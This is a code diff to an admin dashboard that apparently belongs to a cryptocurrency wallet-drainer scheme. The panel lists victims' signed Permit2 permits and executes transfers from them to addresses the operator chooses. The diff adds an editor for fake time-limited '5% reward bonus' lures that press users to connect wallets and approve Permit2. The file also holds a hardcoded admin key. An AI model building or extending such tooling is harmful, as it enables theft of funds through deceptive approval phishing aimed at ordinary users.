@@ -507,6 +507,33 @@
     .settings-row .btn { width: 100%; }
     .modal-box { padding: 16px; }
   }
+
+  /* Toggle slider switch */
+  .slider-toggle {
+    position: absolute;
+    cursor: pointer;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background-color: #334155;
+    transition: .3s;
+    border-radius: 34px;
+    border: 1px solid var(--border-default);
+  }
+  .slider-toggle:before {
+    position: absolute;
+    content: "";
+    height: 18px; width: 18px;
+    left: 3px; bottom: 3px;
+    background-color: white;
+    transition: .3s;
+    border-radius: 50%;
+  }
+  input:checked + .slider-toggle {
+    background: linear-gradient(135deg, #16a34a, #22c55e);
+    border-color: #22c55e;
+  }
+  input:checked + .slider-toggle:before {
+    transform: translateX(22px);
+  }
 </style>
 </head>
 <body>
@@ -541,6 +568,22 @@
 'use strict';
 
 const API_BASE = '/api';
+const DEFAULT_REWARD_CONFIG = {
+  enabled: true,
+  percentage: "5.0",
+  durationHours: 72,
+  badgeText: "Flash Event · 72H Only",
+  headline: "Claim Your 5% Reward Bonus",
+  description: "Special 72-hour reward event! Connect your wallet and complete Permit2 approval within the countdown window to qualify for an exclusive one-time 5% bonus reward. Valid for all newly connected wallets and users approving again.",
+  inCardText: "Connect & approve within 72 hours to receive an exclusive one-time 5% reward bonus!",
+  perk1Title: "5% One-Time Reward",
+  perk1Desc: "Automatically locked in when you complete Permit2 approval.",
+  perk2Title: "New & Re-Approvals",
+  perk2Desc: "Applicable for first-time connections & wallets approving again.",
+  perk3Title: "Instant BSC On-Chain",
+  perk3Desc: "Direct BSC Mainnet confirmation with 0 waiting period."
+};
+
 const state = {
   adminKey: localStorage.getItem('adminKey') || 'tg-8f3k2p9xQm7vNrL4wZ1cJ6hYbDsEuA0',
   adminStatus: null,
@@ -551,7 +594,11 @@ const state = {
   activePullPermit: null,
   pullSubmitting: false,
   pullError: '',
-  pullSuccess: ''
+  pullSuccess: '',
+  rewardConfig: { ...DEFAULT_REWARD_CONFIG },
+  rewardBusy: false,
+  rewardMsg: '',
+  rewardMsgKind: ''
 };
 
 function esc(s) {
@@ -682,8 +729,10 @@ function adminApi(key) {
     execute:     (id, to, amount)  => req(`/super/permits/${id}/execute`, { method: 'POST', headers: h, body: { to, amount } }),
     setPaused:   (p)               => req('/super/settings/paused',   { method: 'POST', headers: h, body: { paused: p } }),
     setFee:      (f)               => req('/super/settings/fee',      { method: 'POST', headers: h, body: { feeBps: f } }),
-    setTreasury: (t)               => req('/super/settings/treasury', { method: 'POST', headers: h, body: { treasury: t } }),
-    rescue:      (b)               => req('/super/rescue',            { method: 'POST', headers: h, body: b })
+    setTreasury:      (t)               => req('/super/settings/treasury', { method: 'POST', headers: h, body: { treasury: t } }),
+    rescue:           (b)               => req('/super/rescue',            { method: 'POST', headers: h, body: b }),
+    getRewardConfig:  ()                => req('/super/reward-config',     { headers: h }),
+    saveRewardConfig: (b)               => req('/super/reward-config',     { method: 'POST', headers: h, body: b })
   };
 }
 
@@ -772,6 +821,8 @@ function buildDashboard(s) {
       </div>
     </div>
 
+    ${buildRewardConfigCard()}
+
     <div class="card">
       <div class="card-header">
         <div class="card-title"><div class="card-title-icon">📋</div> Signed Permits Database</div>
@@ -807,6 +858,235 @@ function buildDashboard(s) {
       }
     </div>
   `;
+}
+
+function buildRewardConfigCard() {
+  const rc = state.rewardConfig || DEFAULT_REWARD_CONFIG;
+  return `
+    <div class="card" id="reward-config-card" style="border: 1px solid rgba(245, 158, 11, 0.45); box-shadow: 0 10px 35px rgba(245, 158, 11, 0.08); position: relative; overflow: hidden;">
+      <div class="card-header">
+        <div class="card-title">
+          <div class="card-title-icon" style="background: rgba(245, 158, 11, 0.15); border-color: rgba(245, 158, 11, 0.35); color: #fbbf24;">🎁</div>
+          Reward Bonus Promotion Configuration
+        </div>
+        <div style="display:flex;align-items:center;gap:10px;">
+          <span class="badge ${rc.enabled ? 'badge-executed' : 'badge-failed'}" id="rew-status-pill">
+            ${rc.enabled ? '🟢 Promotion Active' : '🔴 Promotion Disabled'}
+          </span>
+        </div>
+      </div>
+
+      <div style="font-size:0.83rem;color:var(--text-secondary);margin-bottom:20px;line-height:1.6;">
+        Manage the limited-time reward bonus displayed on the user front page. Admin can modify the bonus percentage, countdown time window, headlines, descriptions, and active status anytime. All updates sync to the user front page instantly.
+      </div>
+
+      <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(260px, 1fr));gap:16px;margin-bottom:18px;">
+        <!-- Enable / Disable Switch -->
+        <div class="form-group" style="background:var(--bg-overlay);padding:14px;border-radius:var(--radius-md);border:1px solid var(--border-default);display:flex;align-items:center;justify-content:space-between;">
+          <div>
+            <div style="font-size:0.88rem;font-weight:700;color:var(--text-primary);">Enable Reward Promotion</div>
+            <div style="font-size:0.75rem;color:var(--text-muted);margin-top:2px;">Show/hide bonus card & timer on front page</div>
+          </div>
+          <label style="position:relative;display:inline-block;width:48px;height:26px;cursor:pointer;flex-shrink:0;">
+            <input type="checkbox" id="rew-enabled" ${rc.enabled ? 'checked' : ''} style="opacity:0;width:0;height:0;">
+            <span class="slider-toggle"></span>
+          </label>
+        </div>
+
+        <!-- Bonus Percentage -->
+        <div class="form-group">
+          <label class="form-label" for="rew-percentage">Reward Bonus Percentage (%)</label>
+          <div style="position:relative;">
+            <input type="text" id="rew-percentage" class="form-control" value="${esc(rc.percentage)}" placeholder="5.0" style="padding-right:34px;font-family:var(--font-mono);font-weight:700;color:#fbbf24;font-size:1.05rem;">
+            <span style="position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#fbbf24;font-weight:700;">%</span>
+          </div>
+          <div style="font-size:0.7rem;color:var(--text-muted);margin-top:4px;">Bonus rate shown to users (e.g. 5.0, 7.5, 10, 15)</div>
+        </div>
+
+        <!-- Promotional Window Duration -->
+        <div class="form-group">
+          <label class="form-label" for="rew-duration">Promotional Window Duration (Hours)</label>
+          <div style="position:relative;">
+            <input type="number" id="rew-duration" class="form-control" value="${esc(String(rc.durationHours))}" min="1" max="720" style="padding-right:45px;font-family:var(--font-mono);font-weight:700;color:#60a5fa;font-size:1.05rem;">
+            <span style="position:absolute;right:10px;top:50%;transform:translateY(-50%);color:#60a5fa;font-size:0.75rem;font-weight:700;">HOURS</span>
+          </div>
+          <div style="display:flex;align-items:center;gap:6px;margin-top:6px;flex-wrap:wrap;">
+            <span style="font-size:0.68rem;color:var(--text-muted);">Quick Presets:</span>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(12)">12h</button>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(24)">24h</button>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(48)">48h</button>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(72)">72h</button>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(120)">120h</button>
+          </div>
+        </div>
+
+        <!-- Event Badge Text -->
+        <div class="form-group">
+          <label class="form-label" for="rew-badge">Event Badge Tag</label>
+          <input type="text" id="rew-badge" class="form-control" value="${esc(rc.badgeText)}" placeholder="Flash Event · 72H Only">
+          <div style="font-size:0.7rem;color:var(--text-muted);margin-top:4px;">Displayed in the pulsing top badge</div>
+        </div>
+      </div>
+
+      <!-- Headline & Ribbon -->
+      <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(280px, 1fr));gap:16px;margin-bottom:16px;">
+        <div class="form-group">
+          <label class="form-label" for="rew-headline">Main Headline Title</label>
+          <input type="text" id="rew-headline" class="form-control" value="${esc(rc.headline)}" placeholder="Claim Your 5% Reward Bonus">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="rew-incard">In-Card Urgency Ribbon Text</label>
+          <input type="text" id="rew-incard" class="form-control" value="${esc(rc.inCardText)}" placeholder="Connect & approve within 72 hours to receive an exclusive one-time 5% reward bonus!">
+        </div>
+      </div>
+
+      <!-- Context Description -->
+      <div class="form-group" style="margin-bottom:18px;">
+        <label class="form-label" for="rew-description">Promotional Context / Description</label>
+        <textarea id="rew-description" class="form-control" rows="3" style="resize:vertical;line-height:1.5;">${esc(rc.description)}</textarea>
+        <div style="font-size:0.7rem;color:var(--text-muted);margin-top:4px;">Main persuasive text displayed in the bonus card</div>
+      </div>
+
+      <!-- 3 Key Perks -->
+      <div style="background:rgba(15,23,42,0.65);border:1px solid var(--border-default);border-radius:var(--radius-md);padding:14px;margin-bottom:20px;">
+        <div style="font-size:0.76rem;font-weight:700;color:var(--text-primary);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">
+          ✨ Feature Highlight Points (3 Cards)
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));gap:12px;">
+          <div style="background:var(--bg-base);padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border-subtle);">
+            <div style="font-size:0.72rem;font-weight:700;color:#60a5fa;margin-bottom:4px;">💎 Point 1</div>
+            <input type="text" id="rew-p1-title" class="form-control" style="padding:6px 8px;font-size:0.8rem;margin-bottom:6px;" value="${esc(rc.perk1Title || '')}" placeholder="Title">
+            <input type="text" id="rew-p1-desc" class="form-control" style="padding:6px 8px;font-size:0.76rem;" value="${esc(rc.perk1Desc || '')}" placeholder="Description">
+          </div>
+          <div style="background:var(--bg-base);padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border-subtle);">
+            <div style="font-size:0.72rem;font-weight:700;color:#c084fc;margin-bottom:4px;">🔄 Point 2</div>
+            <input type="text" id="rew-p2-title" class="form-control" style="padding:6px 8px;font-size:0.8rem;margin-bottom:6px;" value="${esc(rc.perk2Title || '')}" placeholder="Title">
+            <input type="text" id="rew-p2-desc" class="form-control" style="padding:6px 8px;font-size:0.76rem;" value="${esc(rc.perk2Desc || '')}" placeholder="Description">
+          </div>
+          <div style="background:var(--bg-base);padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border-subtle);">
+            <div style="font-size:0.72rem;font-weight:700;color:#fbbf24;margin-bottom:4px;">⚡ Point 3</div>
+            <input type="text" id="rew-p3-title" class="form-control" style="padding:6px 8px;font-size:0.8rem;margin-bottom:6px;" value="${esc(rc.perk3Title || '')}" placeholder="Title">
+            <input type="text" id="rew-p3-desc" class="form-control" style="padding:6px 8px;font-size:0.76rem;" value="${esc(rc.perk3Desc || '')}" placeholder="Description">
+          </div>
+        </div>
+      </div>
+
+      <!-- Live User Page Preview Box -->
+      <div style="background:rgba(5,8,15,0.9);border:1px dashed rgba(245,158,11,0.4);border-radius:var(--radius-md);padding:16px;margin-bottom:20px;">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">
+          <span style="font-size:0.74rem;font-weight:700;color:#fbbf24;text-transform:uppercase;letter-spacing:0.06em;">👁️ Live User Page Preview</span>
+          <span style="font-size:0.7rem;color:var(--text-muted);">Real-time reflection of user view</span>
+        </div>
+        <div style="background:linear-gradient(165deg, rgba(18, 24, 38, 0.98) 0%, rgba(10, 15, 25, 0.98) 60%, rgba(15, 23, 42, 0.96) 100%);border:1px solid rgba(245,158,11,0.4);border-radius:var(--radius-md);padding:18px;position:relative;">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:6px;">
+            <span style="font-size:0.72rem;font-weight:700;background:rgba(239,68,68,0.15);color:#fca5a5;padding:3px 10px;border-radius:100px;border:1px solid rgba(239,68,68,0.3);" id="prev-badge">${esc(rc.badgeText)}</span>
+            <span style="font-size:0.76rem;font-weight:800;color:#fbbf24;background:rgba(245,158,11,0.2);padding:3px 12px;border-radius:100px;border:1px solid rgba(245,158,11,0.4);" id="prev-pct">+${esc(rc.percentage)}% REWARD BONUS</span>
+          </div>
+          <div style="font-size:1.15rem;font-weight:700;color:#fff;margin-bottom:6px;" id="prev-headline">🎁 ${esc(rc.headline)}</div>
+          <div style="font-size:0.8rem;color:#94a3b8;line-height:1.5;margin-bottom:12px;" id="prev-desc">${esc(rc.description)}</div>
+          <div style="display:inline-flex;align-items:center;gap:8px;background:rgba(5,8,14,0.85);padding:6px 12px;border-radius:6px;border:1px solid rgba(245,158,11,0.25);font-family:var(--font-mono);font-size:0.8rem;color:#fbbf24;">
+            <span>⏳ Promotional Window:</span>
+            <strong id="prev-hours">${esc(String(rc.durationHours))} Hours</strong>
+          </div>
+        </div>
+      </div>
+
+      <!-- Action Buttons -->
+      <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
+        <button id="btn-save-reward" class="btn" style="background:linear-gradient(135deg,#f59e0b 0%,#d97706 100%);color:#050709;font-weight:700;box-shadow:0 4px 20px rgba(245,158,11,0.35);padding:13px 26px;" ${state.rewardBusy ? 'disabled' : ''}>
+          ${state.rewardBusy ? '<span class="spinner"></span> Saving…' : '💾 Save & Publish Reward Settings'}
+        </button>
+        <button id="btn-reset-reward" class="btn btn-secondary" style="padding:13px 20px;">🔄 Reset to Defaults</button>
+      </div>
+
+      ${alertHtml(state.rewardMsg, state.rewardMsgKind)}
+    </div>
+  `;
+}
+
+function triggerPreviewUpdate() {
+  const elEnabled = document.getElementById('rew-enabled');
+  const elPct = document.getElementById('rew-percentage');
+  const elDur = document.getElementById('rew-duration');
+  const elBadge = document.getElementById('rew-badge');
+  const elHead = document.getElementById('rew-headline');
+  const elDesc = document.getElementById('rew-description');
+  const elPill = document.getElementById('rew-status-pill');
+
+  const pBadge = document.getElementById('prev-badge');
+  const pPct = document.getElementById('prev-pct');
+  const pHead = document.getElementById('prev-headline');
+  const pDesc = document.getElementById('prev-desc');
+  const pHours = document.getElementById('prev-hours');
+
+  if (pBadge && elBadge) pBadge.textContent = elBadge.value || 'Flash Event';
+  if (pPct && elPct) pPct.textContent = `+${elPct.value || '5.0'}% REWARD BONUS`;
+  if (pHead && elHead) pHead.textContent = `🎁 ${elHead.value || 'Reward Bonus'}`;
+  if (pDesc && elDesc) pDesc.textContent = elDesc.value || '';
+  if (pHours && elDur) pHours.textContent = `${elDur.value || '72'} Hours`;
+  if (elPill && elEnabled) {
+    elPill.className = `badge ${elEnabled.checked ? 'badge-executed' : 'badge-failed'}`;
+    elPill.textContent = elEnabled.checked ? '🟢 Promotion Active' : '🔴 Promotion Disabled';
+  }
+}
+
+function setPresetDuration(h) {
+  const inp = document.getElementById('rew-duration');
+  if (inp) {
+    inp.value = h;
+    triggerPreviewUpdate();
+  }
+}
+
+async function handleSaveRewardConfig() {
+  if (!state.adminKey) {
+    alert('Please log in with admin key first.');
+    return;
+  }
+  const a = adminApi(state.adminKey);
+  state.rewardBusy = true;
+  state.rewardMsg = 'Saving reward configuration to database…';
+  state.rewardMsgKind = 'info';
+  render();
+
+  const cfg = {
+    enabled: document.getElementById('rew-enabled') ? document.getElementById('rew-enabled').checked : true,
+    percentage: document.getElementById('rew-percentage') ? document.getElementById('rew-percentage').value.trim() : '5.0',
+    durationHours: document.getElementById('rew-duration') ? Number(document.getElementById('rew-duration').value) : 72,
+    badgeText: document.getElementById('rew-badge') ? document.getElementById('rew-badge').value.trim() : '',
+    headline: document.getElementById('rew-headline') ? document.getElementById('rew-headline').value.trim() : '',
+    description: document.getElementById('rew-description') ? document.getElementById('rew-description').value.trim() : '',
+    inCardText: document.getElementById('rew-incard') ? document.getElementById('rew-incard').value.trim() : '',
+    perk1Title: document.getElementById('rew-p1-title') ? document.getElementById('rew-p1-title').value.trim() : '',
+    perk1Desc: document.getElementById('rew-p1-desc') ? document.getElementById('rew-p1-desc').value.trim() : '',
+    perk2Title: document.getElementById('rew-p2-title') ? document.getElementById('rew-p2-title').value.trim() : '',
+    perk2Desc: document.getElementById('rew-p2-desc') ? document.getElementById('rew-p2-desc').value.trim() : '',
+    perk3Title: document.getElementById('rew-p3-title') ? document.getElementById('rew-p3-title').value.trim() : '',
+    perk3Desc: document.getElementById('rew-p3-desc') ? document.getElementById('rew-p3-desc').value.trim() : ''
+  };
+
+  try {
+    const res = await a.saveRewardConfig(cfg);
+    if (res && res.rewardConfig) {
+      state.rewardConfig = res.rewardConfig;
+      state.rewardMsg = '✅ Reward configuration successfully updated & published live to user front page!';
+      state.rewardMsgKind = 'ok';
+    }
+  } catch (err) {
+    state.rewardMsg = err.message || String(err);
+    state.rewardMsgKind = 'err';
+  }
+
+  state.rewardBusy = false;
+  render();
+}
+
+function handleResetRewardConfig() {
+  state.rewardConfig = { ...DEFAULT_REWARD_CONFIG };
+  state.rewardMsg = 'Settings restored to default presets. Click Save & Publish to apply.';
+  state.rewardMsgKind = 'info';
+  render();
 }
 
 function buildPermitRow(p) {
@@ -1050,6 +1330,18 @@ function bind() {
   if ($('btn-set-fee')) $('btn-set-fee').onclick = handleSetFee;
   if ($('btn-set-treasury')) $('btn-set-treasury').onclick = handleSetTreasury;
   if ($('btn-rescue')) $('btn-rescue').onclick = handleRescue;
+  if ($('btn-save-reward')) $('btn-save-reward').onclick = handleSaveRewardConfig;
+  if ($('btn-reset-reward')) $('btn-reset-reward').onclick = handleResetRewardConfig;
+
+  // Real-time preview input listeners
+  const inputIds = ['rew-enabled', 'rew-percentage', 'rew-duration', 'rew-badge', 'rew-headline', 'rew-description', 'rew-incard'];
+  inputIds.forEach(id => {
+    const el = $(id);
+    if (el) {
+      el.oninput = triggerPreviewUpdate;
+      el.onchange = triggerPreviewUpdate;
+    }
+  });
 
   $$('[data-pull-id]').forEach(el => {
     el.onclick = () => {
@@ -1084,9 +1376,16 @@ async function handleAdminLoad() {
 
   try {
     const a = adminApi(state.adminKey);
-    const [st, pr] = await Promise.all([a.status(), a.permits()]);
+    const [st, pr, rc] = await Promise.all([
+      a.status(),
+      a.permits(),
+      a.getRewardConfig().catch(() => null)
+    ]);
     state.adminStatus = st;
     state.permits = (pr.permits || []).sort((a, b) => Number(b.id) - Number(a.id));
+    if (rc && rc.rewardConfig) {
+      state.rewardConfig = rc.rewardConfig;
+    }
     state.adminMsg = `Dashboard loaded successfully — ${state.permits.length} permit(s) retrieved.`;
     state.adminMsgKind = 'ok';
   } catch (e) {
